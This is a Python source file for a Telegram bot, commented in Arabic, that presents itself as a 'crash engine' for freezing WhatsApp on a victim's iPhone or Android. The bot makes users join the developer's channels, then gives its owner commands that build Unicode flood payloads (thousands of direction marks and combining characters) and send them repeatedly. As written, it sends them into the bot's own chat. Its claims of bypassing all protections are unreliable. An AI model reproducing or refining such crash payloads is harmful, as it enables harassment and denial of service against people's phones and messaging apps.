import os
from flask import Flask
from threading import Thread

app = Flask('')

@app.route('/')
def home():
    return "The Beast is Online!"

def run():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

Thread(target=run).start()
import telebot
from telebot import types
import config

bot = telebot.TeleBot(config.TOKEN)

# دالة التحقق من الاشتراك الإجباري
def check_sub(user_id):
    for channel in config.CHANNELS:
        try:
            status = bot.get_chat_member(channel['id'], user_id).status
            if status == 'left':
                return False
        except:
            continue
    return True

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    
    # نص الترحيب مع بيانات المطور
    welcome_text = f"🔥 **WELCOME TO THE CRASH ENGINE v9.9** 🔥\n\n"
    welcome_text += f"Developer: {config.DEV_NAME}\n"
    welcome_text += f"Contact: {config.DEV_PHONE}\n"
    welcome_text += f"User: {config.DEV_USER}\n\n"
    welcome_text += "⚠️ **يجب عليك الاشتراك في جميع قنوات المطور لتفعيل البوت!**"

    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("القناة الأولى 📢", url=config.CHANNELS[0]['url'])
    btn2 = types.InlineKeyboardButton("القناة الثانية 📢", url=config.CHANNELS[1]['url'])
    btn3 = types.InlineKeyboardButton("يوتيوب 🎥", url=config.YOUTUBE)
    btn4 = types.InlineKeyboardButton("إنستقرام 📸", url=config.INSTA)
    btn5 = types.InlineKeyboardButton("قناة الواتساب 🟢", url=config.WHATSAPP_CH)
    check_btn = types.InlineKeyboardButton("✅ تم الاشتراك - تفعيل", callback_data="check")
    
    markup.add(btn1, btn2, btn3, btn4, btn5)
    markup.add(check_btn)
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "check")
def verify(call):
    if check_sub(call.from_user.id):
        bot.answer_callback_query(call.id, "✅ تم التحقق! أنت الآن جاهز للاستخدام يا وحش.")
        bot.send_message(call.message.chat.id, "😈 **أرسل .menu الآن لعرض أدوات التدمير!**")
    else:
        bot.answer_callback_query(call.id, "❌ لم تشترك في كافة القنوات بعد!", show_alert=True)

@bot.message_handler(func=lambda m: m.text == ".menu")
def crash_menu(message):
    if message.from_user.id != config.ADMIN_ID:
        bot.reply_to(message, "🚫 هذا الأمر مخصص فقط لـ 'الوحش' صاحب البوت.")
        return

    menu_text = "☣️ **قائمة الكراش الشامل (Year 2099)** ☣️\n\n"
    menu_text += "🔹 `.crash_ios [رقم]` - حرق نسخة الأيفون نهائياً.\n"
    menu_text += "🔹 `.crash_android [رقم]` - تجميد نظام الأندرويد.\n"
    menu_text += "🔹 `.crash_web [رقم]` - إسقاط واتساب ويب.\n\n"
    menu_text += "⚠️ تحذير: القوة المستخدمة هنا تتخطى كافة الحمايات."
    bot.send_message(message.chat.id, menu_text, parse_mode="Markdown")

# هنا يتم وضع Logic إرسال الـ Payloads الثقيلة (Unicode Loops)
@bot.message_handler(func=lambda m: m.text.startswith(".crash_ios"))
def execute_ios_crash(message):
    if message.from_user.id != config.ADMIN_ID:
        return

    target = message.text.split(" ")[1] if len(message.text.split(" ")) > 1 else "Target"
    
    # حمولة اليونيكود القاتلة (The Ghost Payload)
    payload = "🔥🔥" + ("\u200e" * 4000) + "😈" + ("\u200f" * 4000) + "💥"
    
    bot.reply_to(message, f"🚀 **جاري قصف {target} بحمولة ARCHITECT-V1...**")
    
    # إرسال 5 موجات تصادمية لتجميد النظام
    for i in range(5):
        bot.send_message(message.chat.id, f"💥 CRASHING TARGET: {target}\n{payload}")
    
    bot.send_message(message.chat.id, "✅ **تم بنجاح! النسخة الآن في حالة شلل تام.**")

@bot.message_handler(func=lambda m: m.text.startswith(".crash_android"))
def execute_android_crash(message):
    if message.from_user.id != config.ADMIN_ID:
        return

    target = message.text.split(" ")[1] if len(message.text.split(" ")) > 1 else "Target"
    
    # حمولة الأندرويد: تعتمد على الرموز التي تستهلك المعالج (CPU Spike)
    # نستخدم مزيجاً من الرموز الكثيفة وجداول البيانات المخفية
    android_payload = "☣️" + ("\u0345" * 6000) + "💠" + ("\u0ea3" * 6000) + "💀"
    
    bot.reply_to(message, f"⚡ **جاري استهداف أندرويد {target} بحمولة NITRO-V2...**")
    
    # إرسال قذائف متتالية لضمان تجميد الهاتف بالكامل
    for i in range(8): # زدنا العدد لضمان شلل الأندرويد
        bot.send_message(message.chat.id, f"💢 ANDROID_DESTROYER: {target}\n{android_payload}")
    
    bot.send_message(message.chat.id, "✅ **تم بنجاح! هاتف الضحية الآن في حالة تجمد (Freeze) ولن يستطيع فتح الواتس.**")
bot.infinity_polling()
